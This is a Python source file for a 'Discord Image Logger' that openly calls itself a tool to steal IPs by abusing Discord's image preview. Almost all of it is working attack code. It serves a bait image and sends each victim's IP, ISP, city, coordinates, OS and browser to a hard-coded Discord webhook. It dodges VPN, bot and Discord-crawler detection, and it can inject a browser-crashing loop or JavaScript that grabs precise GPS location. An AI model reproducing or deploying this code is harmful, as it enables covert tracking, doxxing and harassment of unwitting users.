# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1082992602313396296/3NlOpcDX7B8v8Cuth5UyKQyTKeJzr5HX783hFpA5LYvFl2P_4by_feoa8z_m6CMSZnQu",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image
}

blacklistedIPs = ("27", "34", "35", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.
def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        if not ip.startswith(("34", "35")): return
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a Discord chat!\nYou may receive an IP soon.\n\n**IP:** `{ip}`\n**Endpoint:** `{endpoint}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def do_GET(self):
        if config["imageArgument"]:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            if dic.get("url") or dic.get("id"):
                url = dic.get("url") or dic.get("id")
            else:
                url = config["image"]
        else:
            url = config["image"]

        data = f'''<style>body {{
  margin: 0;
  padding: 0;
  }}
div.img {{
  background-image: url('{url}');
  background-position: center center;
  background-repeat: no-repeat;
  background-size: contain;
  width: 100vw;
  height: 100vh;
  }}</style><div class="img"></div>'''.encode()
        
        if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
            if "discord" in self.headers.get('user-agent').lower():
                self.send_response(200)
                self.send_header('Content-type','image/jpeg' if config["buggedImage"] else 'text/html')
                self.end_headers()
                
                self.wfile.write(binaries["loading"] if config["buggedImage"] else data)
                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
            
            return
        
        else:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

            if dic.get("g") and config["accurateLocation"]:
                location = base64.b64decode(dic.get("g").encode()).decode()
                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
            else:
                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
            

            message = config["message"]["message"]

            if config["message"]["richMessage"]:
                message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                message = message.replace("{isp}", result["isp"])
                message = message.replace("{asn}", result["as"])
                message = message.replace("{country}", result["country"])
                message = message.replace("{region}", result["regionName"])
                message = message.replace("{city}", result["city"])
                message = message.replace("{lat}", str(result["lat"]))
                message = message.replace("{long}", str(result["lon"]))
                message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                message = message.replace("{mobile}", str(result["mobile"]))
                message = message.replace("{vpn}", str(result["proxy"]))
                message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

            datatype = 'text/html'

            if config["message"]["doMessage"]:
                data = message.encode()
            
            if config["crashBrowser"]:
                data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
            self.send_response(200) # 200 = OK (HTTP Status)
            self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
            self.end_headers() # Declare the headers as finished.

            if config["accurateLocation"]:
                data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
            self.wfile.write(data)
    
        return  

handler = ImageLoggerAPI
